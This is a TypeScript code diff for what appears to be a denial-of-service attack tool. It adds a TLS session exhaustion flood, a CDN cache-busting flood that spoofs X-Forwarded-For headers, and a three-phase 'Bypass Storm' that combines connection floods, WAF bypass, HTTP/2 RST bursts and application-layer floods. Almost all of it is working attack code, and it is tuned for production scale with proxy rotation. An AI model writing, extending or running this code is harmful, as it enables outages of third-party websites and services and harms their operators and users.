@@ -5236,6 +5236,226 @@ setInterval(() => {
   parentPort?.postMessage({ codes: snap, latAvgMs });
 }, 1000).unref();
 
+// ═══════════════════════════════════════════════════════════════════════════════
+//  TLS SESSION CACHE EXHAUSTION
+//  Forces a full TLS handshake on every connection — no session resumption.
+//  Saturates the server's crypto thread pool with RSA/ECDHE operations.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runTLSSessionExhaust(
+  resolvedHost: string,
+  hostname:     string,
+  port:         number,
+  threads:      number,
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const MAX_CONN = !IS_PROD
+    ? Math.min(threads * 6, 400)
+    : IS_DEPLOYED ? Math.min(threads * 50, 15000) : Math.min(threads * 30, 8000);
+
+  // Rotate TLS parameters per connection to defeat session-ID caching
+  const TLS_VARIANTS: Array<{ ciphers: string; ecdhCurve: string; minVersion: string }> = [
+    { ciphers: "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256",            ecdhCurve: "P-256",    minVersion: "TLSv1.2" },
+    { ciphers: "TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES256-GCM-SHA384",            ecdhCurve: "P-384",    minVersion: "TLSv1.2" },
+    { ciphers: "TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-CHACHA20-POLY1305",      ecdhCurve: "X25519",   minVersion: "TLSv1.3" },
+    { ciphers: "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",      ecdhCurve: "P-256",    minVersion: "TLSv1.2" },
+    { ciphers: "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256",               ecdhCurve: "P-521",    minVersion: "TLSv1.2" },
+  ];
+
+  let localPkts = 0, localBytes = 0, activeConns = 0;
+  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 250);
+
+  const oneHandshake = async (): Promise<void> => {
+    if (signal.aborted) return;
+    const variant = TLS_VARIANTS[randInt(0, TLS_VARIANTS.length)];
+    return new Promise<void>(resolve => {
+      let settled = false;
+      const cleanup = (success = false) => {
+        if (settled) return;
+        settled = true;
+        activeConns = Math.max(0, activeConns - 1);
+        try { sock.destroy(); } catch { /**/ }
+        if (success) { localPkts++; localBytes += 2048; }
+        resolve();
+      };
+
+      const sock = tls.connect({
+        host: resolvedHost,
+        port,
+        servername: hostname,
+        ciphers:   variant.ciphers,
+        ecdhCurve: variant.ecdhCurve,
+        minVersion: variant.minVersion as "TLSv1.2" | "TLSv1.3",
+        // Force new session — disable all forms of resumption
+        rejectUnauthorized: false,
+        session:   undefined,
+      });
+
+      sock.setTimeout(8_000);
+      activeConns++;
+
+      sock.once("secureConnect", () => {
+        // Send minimal HTTP/1.1 GET then immediately destroy — forces full handshake overhead
+        const req = `GET /?_s=${randStr(12)} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\nConnection: close\r\n\r\n`;
+        sock.write(req);
+        localBytes += req.length;
+        // Short hold then destroy — maximizes handshake-to-request ratio
+        setTimeout(() => cleanup(true), randInt(20, 80));
+      });
+      sock.once("error",   () => cleanup(false));
+      sock.once("timeout", () => cleanup(false));
+      signal.addEventListener("abort", () => cleanup(false), { once: true });
+    });
+  };
+
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      await oneHandshake();
+      // No delay — immediately reconnect to maintain handshake pressure
+    }
+  };
+
+  const concurrency = Math.min(MAX_CONN, IS_DEPLOYED ? threads * 12 : threads * 4);
+  await Promise.all(Array.from({ length: concurrency }, runSlot));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  HTTP CACHE BUSTING — 100% Origin Hit Rate
+//  Every request carries unique cache keys → CDN always misses → origin saturated
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runCacheBuster(
+  base:     string,
+  threads:  number,
+  proxies:  ProxyConfig[],
+  signal:   AbortSignal,
+  onStats:  (p: number, b: number) => void,
+): Promise<void> {
+  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 64, 8000) : Math.min(threads * 16, 600);
+
+  // Vary dimensions that force unique cache keys per request
+  const ACCEPT_LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.8", "ja,en;q=0.8", "zh-CN,zh;q=0.9", "ar,en;q=0.8"];
+  const ACCEPT_ENC   = ["gzip, deflate, br", "gzip, deflate", "br, gzip", "identity", "gzip", "deflate, br"];
+  const CB_PATHS     = ["/", "/index.html", "/api/data", "/assets/main.js", "/api/v1/feed", "/search", "/home", "/products", "/blog", "/about"];
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  let inflight = 0;
+  const isHttps = base.startsWith("https:");
+
+  const doRequest = () => {
+    if (signal.aborted || inflight >= MAX_INFLIGHT) return;
+    inflight++;
+    const path    = CB_PATHS[randInt(0, CB_PATHS.length)];
+    const cbParam = `_cb=${randStr(16)}&_t=${Date.now()}&_r=${randStr(8)}&_v=${randInt(1, 99999)}`;
+    const lang    = ACCEPT_LANGS[randInt(0, ACCEPT_LANGS.length)];
+    const enc     = ACCEPT_ENC[randInt(0, ACCEPT_ENC.length)];
+    const u       = new URL(`${base}${path}?${cbParam}`);
+    const reqHdrs: Record<string, string> = {
+      "User-Agent":       randUA(),
+      "Accept":           "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
+      "Accept-Language":  lang,
+      "Accept-Encoding":  enc,
+      "Cache-Control":    "no-cache, no-store, must-revalidate",
+      "Pragma":           "no-cache",
+      "Expires":          "0",
+      "X-Forwarded-For":  randIp(),
+      "X-Real-IP":        randIp(),
+    };
+
+    const startMs = Date.now();
+    const proxyConf = proxies.length > 0 ? pickProxy(proxies) : undefined;
+
+    if (proxyConf) {
+      // Use proxy path
+      fetchViaProxy(`${base}${path}?${cbParam}`, proxyConf, "GET", reqHdrs)
+        .then(bytes => { workerTrackCode(200, Date.now() - startMs); localPkts++; localBytes += bytes; inflight = Math.max(0, inflight - 1); })
+        .catch(() => { inflight = Math.max(0, inflight - 1); });
+    } else {
+      const agent = isHttps ? HTTPS_KA_AGENT : HTTP_KA_AGENT;
+      const reqOpts = {
+        host:    u.hostname,
+        port:    parseInt(u.port, 10) || (isHttps ? 443 : 80),
+        path:    u.pathname + u.search,
+        headers: reqHdrs,
+        agent,
+        timeout: 10_000,
+      };
+      const req = (isHttps ? https : http).get(reqOpts, (res) => {
+        workerTrackCode(res.statusCode ?? 0, Date.now() - startMs);
+        localPkts++;
+        localBytes += 512;
+        res.resume();
+        inflight = Math.max(0, inflight - 1);
+      });
+      req.on("error", () => { inflight = Math.max(0, inflight - 1); });
+      req.on("timeout", () => { req.destroy(); inflight = Math.max(0, inflight - 1); });
+    }
+  };
+
+  const launcher = async () => {
+    while (!signal.aborted) {
+      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
+      else { await new Promise(r => setTimeout(r, 0)); }
+    }
+  };
+
+  await Promise.all(Array.from({ length: Math.min(threads, 16) }, launcher));
+  clearInterval(flushIv);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+//  BYPASS STORM — 3-Phase Adaptive Composite Attack
+//  Phase 1: TLS Session Exhaust + Conn Flood (connection table saturation)
+//  Phase 2: WAF Bypass + H2 RST Burst (bypass during saturation)
+//  Phase 3: App Smart Flood + Cache Busting (application layer annihilation)
+//  All phases run concurrently with separate thread pools after warmup.
+// ═══════════════════════════════════════════════════════════════════════════════
+async function runBypassStorm(
+  base:         string,
+  resolvedHost: string,
+  hostname:     string,
+  port:         number,
+  threads:      number,
+  proxies:      ProxyConfig[],
+  signal:       AbortSignal,
+  onStats:      (p: number, b: number, c?: number) => void,
+): Promise<void> {
+  const isHttps = port === 443 || /^https:/i.test(base);
+
+  // Thread allocation: distribute across 3 phases
+  const p1Threads = Math.max(1, Math.floor(threads * 0.3)); // Phase 1: TLS exhaust + conn flood
+  const p2Threads = Math.max(1, Math.floor(threads * 0.45)); // Phase 2: WAF bypass + H2 RST
+  const p3Threads = Math.max(1, threads - p1Threads - p2Threads); // Phase 3: App + Cache bust
+
+  const subStats = (p: number, b: number, c = 0) => onStats(p, b, c);
+
+  // Phase 1: Start immediately — build connection table pressure
+  const phase1 = Promise.all([
+    runTLSSessionExhaust(resolvedHost, hostname, port, Math.ceil(p1Threads / 2), signal, subStats),
+    runConnFlood(resolvedHost, hostname, port, Math.max(1, Math.floor(p1Threads / 2)), signal, subStats, isHttps, proxies),
+  ]);
+
+  // Phase 2: Start after 2 second warmup — bypass while table is under pressure
+  const phase2 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 2000 : 500))
+    .then(() => Promise.all([
+      runWAFBypass(base, Math.ceil(p2Threads / 2), proxies, signal, subStats),
+      runH2RstBurst(resolvedHost, hostname, port, Math.max(1, Math.floor(p2Threads / 2)), signal, subStats),
+    ]));
+
+  // Phase 3: Start after 4 second warmup — app-layer annihilation
+  const phase3 = new Promise<void>(resolve => setTimeout(resolve, IS_PROD ? 4000 : 1000))
+    .then(() => Promise.all([
+      runAppSmartFlood(base, Math.ceil(p3Threads / 2), proxies, signal, subStats),
+      runCacheBuster(base, Math.max(1, Math.floor(p3Threads / 2)), proxies, signal, (p, b) => onStats(p, b)),
+    ]));
+
+  await Promise.all([phase1, phase2, phase3]);
+}
+
 // ── Worker entry — handle all errors gracefully ────────────────────────
 const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
 const UDP = new Set(["udp-flood","udp-bypass"]);
@@ -5406,6 +5626,18 @@ async function runWorker() {
   } else if (cfg.method === "grpc-flood") {
     // gRPC Flood — HTTP/2 application/grpc content-type, exhausts gRPC handler thread pool
     await runGRPCFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "tls-session-exhaust") {
+    // TLS Session Cache Exhaustion — full handshake per connection, no resumption, saturates crypto thread pool
+    await runTLSSessionExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "cache-buster") {
+    // HTTP Cache Busting — unique params + Vary headers force 100% CDN cache miss, all hits go to origin
+    await runCacheBuster(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, (p, b) => onStats(p, b));
+
+  } else if (cfg.method === "bypass-storm") {
+    // Bypass Storm — 3-phase composite: TLS exhaust → WAF bypass + H2 RST → App flood + Cache busting
+    await runBypassStorm(base, resolvedHost, hostname, targetPort, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
